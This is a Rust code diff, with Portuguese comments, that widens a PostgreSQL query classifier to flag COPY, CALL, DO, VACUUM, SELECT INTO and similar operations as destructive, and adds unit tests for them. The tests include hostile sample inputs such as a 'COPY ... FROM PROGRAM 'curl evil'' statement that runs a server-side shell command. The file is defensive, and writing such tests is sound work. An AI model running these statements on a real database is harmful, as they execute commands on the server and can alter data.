@@ -2,7 +2,8 @@
 //!
 //! O `sqlparser` é a fonte de verdade: ele entende CTE, `EXPLAIN ANALYZE` e a sintaxe do
 //! PostgreSQL que o heurístico de regex do legado não entendia. A classificação continua sendo a
-//! política do produto (as dez palavras destrutivas do legado), mas agora percorre a AST inteira.
+//! política do produto (as dez palavras do legado mais as operações de escrita/execução que o parser
+//! identifica), mas agora percorre a AST inteira.
 //!
 //! Quando o parse falha, o tokenizador procura palavras destrutivas fora de strings e comentários.
 //! Se até o tokenizador falhar, o heurístico antigo é o último recurso: nunca classificamos como
@@ -11,7 +12,7 @@
 use std::sync::LazyLock;
 
 use regex::Regex;
-use sqlparser::ast::{Query, Set, SetExpr, Statement};
+use sqlparser::ast::{CopyTarget, Query, Set, SetExpr, Statement};
 use sqlparser::dialect::PostgreSqlDialect;
 use sqlparser::parser::Parser;
 use sqlparser::tokenizer::{Token, Tokenizer};
@@ -25,9 +26,13 @@ pub enum QueryType {
     Destructive,
 }
 
-/// Palavras que abrem uma operação destrutiva, como no `DestructiveKeywords` do legado.
-const DESTRUCTIVE_KEYWORDS: [&str; 10] = [
-    "INSERT", "UPDATE", "DELETE", "ALTER", "DROP", "CREATE", "TRUNCATE", "MERGE", "GRANT", "REVOKE",
+/// Palavras que abrem uma operação destrutiva.
+///
+/// As dez do legado continuam valendo; as demais cobrem operações que o legado não classificava e
+/// que podem escrever dados, executar código no servidor ou reescrever relações.
+const DESTRUCTIVE_KEYWORDS: &[&str] = &[
+    "INSERT", "UPDATE", "DELETE", "ALTER", "DROP", "CREATE", "TRUNCATE", "MERGE", "GRANT",
+    "REVOKE", "COPY", "CALL", "DO", "VACUUM", "REINDEX", "CLUSTER", "REFRESH", "INTO",
 ];
 
 /// Comentários de linha (`--` até o fim da linha) e de bloco (`/* ... */`).
@@ -99,6 +104,17 @@ fn destructive_operation(statement: &Statement) -> Option<&'static str> {
             }
         }
         Statement::Set(Set::SetRole { .. }) => Some("SET"),
+        Statement::Copy { to, target, .. } => {
+            // `COPY FROM` escreve dados; `COPY ... PROGRAM` executa comando no servidor nos dois
+            // sentidos. `COPY TO STDOUT`/arquivo é leitura do banco e continua seguro.
+            if !*to || matches!(target, CopyTarget::Program { .. }) {
+                Some("COPY")
+            } else {
+                None
+            }
+        }
+        Statement::Call(_) => Some("CALL"),
+        Statement::Vacuum(_) => Some("VACUUM"),
         _ => destructive_keyword(&statement_keyword(statement)),
     }
 }
@@ -127,6 +143,7 @@ fn set_expr_operation(body: &SetExpr) -> Option<&'static str> {
         SetExpr::SetOperation { left, right, .. } => {
             set_expr_operation(left).or_else(|| set_expr_operation(right))
         }
+        SetExpr::Select(select) if select.into.is_some() => Some("SELECT INTO"),
         SetExpr::Select(_) | SetExpr::Values(_) | SetExpr::Table(_) => None,
     }
 }
@@ -346,6 +363,55 @@ mod tests {
             analyze("EXPLAIN ANALYZE UPDATE users SET name = 'x'"),
             QueryType::Destructive
         );
+    }
+
+    #[test]
+    /// CONTRACT: IF-261
+    fn copy_from_and_program_are_destructive() {
+        for query in [
+            "COPY users FROM PROGRAM 'curl evil'",
+            "COPY users FROM STDIN",
+            "COPY users FROM '/tmp/users.csv'",
+            "COPY users TO PROGRAM 'cat > /tmp/x'",
+        ] {
+            assert_eq!(analyze(query), QueryType::Destructive, "{query}");
+        }
+
+        for query in ["COPY users TO STDOUT", "COPY users TO '/tmp/users.csv'"] {
+            assert_eq!(analyze(query), QueryType::Safe, "{query}");
+        }
+    }
+
+    #[test]
+    /// CONTRACT: IF-261
+    fn call_select_into_and_maintenance_are_destructive() {
+        for query in [
+            "CALL refresh_totals()",
+            "SELECT * INTO backup FROM users",
+            "VACUUM users",
+            "REINDEX TABLE users",
+            "CLUSTER users USING users_idx",
+            "REFRESH MATERIALIZED VIEW totals",
+            "DO $$ BEGIN PERFORM 1; END $$",
+        ] {
+            assert_eq!(analyze(query), QueryType::Destructive, "{query}");
+        }
+    }
+
+    #[test]
+    /// CONTRACT: IF-261
+    fn the_description_of_the_new_destructive_operations_is_explicit() {
+        assert_eq!(description("COPY users FROM PROGRAM 'x'"), "COPY");
+        assert_eq!(description("CALL refresh_totals()"), "CALL");
+        assert_eq!(
+            description("SELECT * INTO backup FROM users"),
+            "SELECT INTO"
+        );
+        assert_eq!(description("VACUUM users"), "VACUUM");
+        assert_eq!(description("REINDEX TABLE users"), "REINDEX");
+        assert_eq!(description("CLUSTER users USING users_idx"), "CLUSTER");
+        assert_eq!(description("REFRESH MATERIALIZED VIEW totals"), "REFRESH");
+        assert_eq!(description("DO $$ BEGIN PERFORM 1; END $$"), "DO");
     }
 
     #[test]
